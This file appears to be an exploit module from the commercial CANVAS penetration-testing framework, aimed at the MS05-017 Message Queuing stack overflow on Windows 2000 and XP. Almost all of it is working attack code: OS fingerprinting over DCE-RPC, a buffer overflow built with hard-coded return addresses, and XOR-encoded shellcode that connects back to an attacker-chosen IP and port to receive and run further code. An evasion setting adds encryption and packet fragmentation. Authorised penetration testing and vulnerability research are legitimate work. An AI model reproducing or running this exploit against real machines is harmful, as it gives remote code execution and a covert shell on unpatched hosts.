#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import time
import struct
import socket
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from shellcode import shellcodeGenerator
from encoder import xorencoder
from MOSDEF import mosdef
import libs.newsmb.libdcerpc as libdcerpc
from libs.newsmb.libdcerpc import s_dce_raw_unistring

NAME='Microsoft Message Queuing Service Overflow'
DESCRIPTION='Microsoft Message Queuing Service GetQueueIdForDirectFormatName() Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='04/12/05'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/ms05-017.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['Note']='Windows XP needs a valid Username and Password.'
DOCUMENTATION["CVE Name"] = "CVE-2005-0059"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0059"
DOCUMENTATION['CVSS'] = 10.0
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']
PROPERTY['MSADV']='MS05-017'
CHANGELOG="""
KK 12/18/07:
Rewritten
"""
NOTES="""
"""

targets={
    0: ['Autoversioning',0],
    1: ['Windows 2000',0x002b5028], #jmp esp (0x780cdf38)
    2: ['Windows XP',0x00225028]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name           = NAME
        self.port           = 2103
        self.version        = 0
        self.badstring      = '\0\xff'
        self.myDCE          = None
        self.connectionList = []
        self.subesp         = 0
        self.covertness     = 0
        self.listenerArgsDict['fromcreatethread'] = 1
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def test(self):
        self.getArgs()
        if self.connect():
            return self.testOS()
        return 0

    def testOS(self):
        if self.QMMgmtGetInfo():
            return 1
        return 0

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        if self.version==0: #we don't want result of testOS to be overwritten
            self.version=int(self.argsDict.get('version',self.version))
        return

    def createShellcode(self):
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':0})
        sc.addAttr('revert_to_self_before_importing_ws2_32',None)
        sc.addAttr('tcpconnect',{'port': self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        sc.addAttr('ExitThread', None)
        rawshellcode=sc.get()
        encoder=xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        ret=encoder.find_key(rawshellcode)
        if ret==0:
            self.log('Could not find a key for this shellcode!')
            raise Exception,'No shellcode generated'
        self.shellcode=encoder.encode(rawshellcode)
        if self.shellcode=='':
            raise Exception,'No shellcode generated'
        self.log('Xor key used: %x'%(encoder.getkey()))
        self.log('Length of shellcode=%s'%(len(self.shellcode)))
        subesp="""xorl   %eax,%eax
movb   $0x8,%ah
subl   %eax,%esp
"""
        self.shellcode=mosdef.assemble(subesp,'x86')+self.shellcode
        return self.shellcode

    def getNetbiosName(self):
        self.serverNBname=''
        self.serverDNSname=''
        request='\x05\x00\x0b\x07\x10\x00\x00\x00\x60\x00\x10\x00\x01\x00\x00\x00\xd0\x16\xd0\x16\x00\x00'+\
                '\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\xe0\x8e\x20\x41\x70\xe9\xd1\x11\x9b\x9e\x00\xe0\x2c'+\
                '\x06\x4c\x39\x01\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60'+\
                '\x02\x00\x00\x00\x0a\x05\x00\x00\x50\x70\x15\x00\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00'+\
                '\x00\x97\x82\x08\xe0'
        if ':' in self.host:
            s = self.gettcpsock(AF_INET6=1)
        else:
            s = self.gettcpsock()
        s.connect((self.host,self.port))
        s.sendall(request)
        response=s.recv(1024)
        if response[2]!='\x0c':
            raise Exception,'Bind request failed to MqSvc service port'
        #print prettyprint(response)
        ntlmSppPacket=response[response.find('NTLMSS'):]
        ntlmSppChall=struct.unpack('@8sLHHLL8s8sHHL',ntlmSppPacket[:48])
        list=ntlmSppPacket[ntlmSppChall[0xa]:]
        i=0
        while i<ntlmSppPacket[0x9]:
            entry=struct.unpack('@HH',list[i:i+4])
            if entry[0]==0x0000:
                break
            if entry[0]==0x0002:
                self.log('Domain Netbios name: %s'%(prettyprint(unicode2ascii(list[i+4:i+4+entry[1]]))))
            if entry[0]==0x0001:
                self.log('Server Netbios name: %s'%(prettyprint(unicode2ascii(list[i+4:i+4+entry[1]]))))
                self.serverNBname=list[i+4:i+4+entry[1]]
            if entry[0]==0x0003:
                self.log('Server DNS name: %s'%(prettyprint(unicode2ascii(list[i+4:i+4+entry[1]]))))
                self.serverDNSname=list[i+4:i+4+entry[1]]
            if entry[0]==0x0004:
                self.log('Domain DNS name: %s'%(prettyprint(unicode2ascii(list[i+4:i+4+entry[1]]))))
            i+=4+entry[1]
        if len(self.serverNBname)==0 or len(self.serverDNSname)==0:
            raise Exception,'Couldn\'t retrieve Server Netbios name or DNS name'

    def connect(self):
        connectionList=self.buildConnectionList()
        res = None
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
            
        for binding in connectionList:
            try:
                self.myDCE=libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                            frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)

        if not res:
            self.log('Could not connect to remote server')
            return 0

        self.log('Connected to server, initiating attack')
        return 1

    def connect_2(self):
        connectionList=self.buildConnectionList_2()
        res = None
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")
            
        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
            
        for binding in connectionList:
            try:
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                              frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)

        if not res:
            self.log('Could not connect to remote service')
            return 0
        
        self.log('Connected to server, initiating attack')
        return 1
    
    def buildConnectionList_2(self):
        self.UUID='fdb3a030-065f-11d1-bb9b-00a024ea5525'
        self.uuidversion='1.0'
        self.connectionList=['ncacn_ip_tcp:%s[%d]'%(self.host,self.port)]
        return self.connectionList

    def buildConnectionList(self):
        self.UUID='41208ee0-e970-11d1-9b9e-00e02c064c39'
        self.uuidversion = '1.0'
        self.connectionList=['ncacn_ip_tcp:%s[%d]'%(self.host,self.port)]
        return self.connectionList

    def QMDeleteObject(self):
        description,eip=targets[self.version]
        packet=''
        packet+=struct.pack('<L',1)
        packet+=struct.pack('<L',1)
        packet+=struct.pack('<L',1)
        packet+=struct.pack('<BBH',3,0,0)
        packet+=struct.pack('<L',0x8a885d03)
        packet+=struct.pack('<L',2)
        data=''
        data+=msunistring('OS:%s\\PRIVATE$\\'%(unicode2ascii(self.serverNBname)))[:-2] #strip out the NULL terminator
        data+='A'*(304-(len(self.serverNBname)+2*len('\\PRIVATE$\\')))
        data+=struct.pack('<L',eip)
        data+='B'*0xc
        data+=self.shellcode
        if (len(data)%2)!=0:
            data+='C'
        packet+=s_dce_raw_unistring(data)
        packet+=struct.pack('<L',0)
        self.log('QMDeleteObject request')
        self.myDCE.call(9,packet,response=True)


    def QMMgmtGetInfo(self):
        packet=''
        packet+=struct.pack('<H',1)
        packet+=struct.pack('<LH',1,0)
        packet+=struct.pack('<LL',1,1)
        packet+=struct.pack('<HBBLLLH',5,0,0,1,1,0,1)
        self.log('QMMgmtGetInfo')
        self.myDCE.call(0, packet, response=True)
        response = self.myDCE.reassembled_data
        self.log('QMMgmtGetInfo response')
        
        try:
            if int(response)==0:
                raise Exception,'QMMgmtGetInfo request failed!'
        except:
            pass
        #print prettyprint(response)
        if len(response)<(0x24+0x10):
            raise Exception,'QMMgmtGetInfo response too short!'
        id=unicode2ascii(response[0x24:])
        #self.log('%s'%(prettyprint(id)))
        self.version=0
        if id.find('2195, x86')!=-1:
            self.log('Remote OS: Windows 2000')
            self.version=1
        elif id.find('2600, x86')!=-1:
            self.log('Remote OS: Windows XP')
            self.version=2
        else:
            self.log('Remote OS: Unknown')
            return 0
        return 1

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(self.name,self.host,self.port),showlog=True)
        try:
            self.log('Getting netbios name')
            self.getNetbiosName()
            self.setProgress(25)
            self.log('Connecting...')
            self.connect()
            self.log('Testing for OS')
            if not self.testOS() or self.version==0:
                raise Exception,'OS detection failed.'
            self.setProgress(50)
            self.log('Connecting again')
            self.connect_2()
            self.setProgress(75)
            self.QMDeleteObject()
            self.setProgress(100)
        except Exception, msg:
            self.log('Exception: %s' % (prettyprint(str(msg))))

        time.sleep(5)
        
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d (succeeded!)'%(self.name,self.host,self.port),showlog=True)
            self.log('%s done (succeeded!)'%(self.name))
            return 1

        self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
        self.log('%s done (failed)'%(self.name))
        return 0

    def usage(self):
        print 'Usage: %s -t host -l localIP -d localPort [-T: testmode]'%(sys.argv[0])
    
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
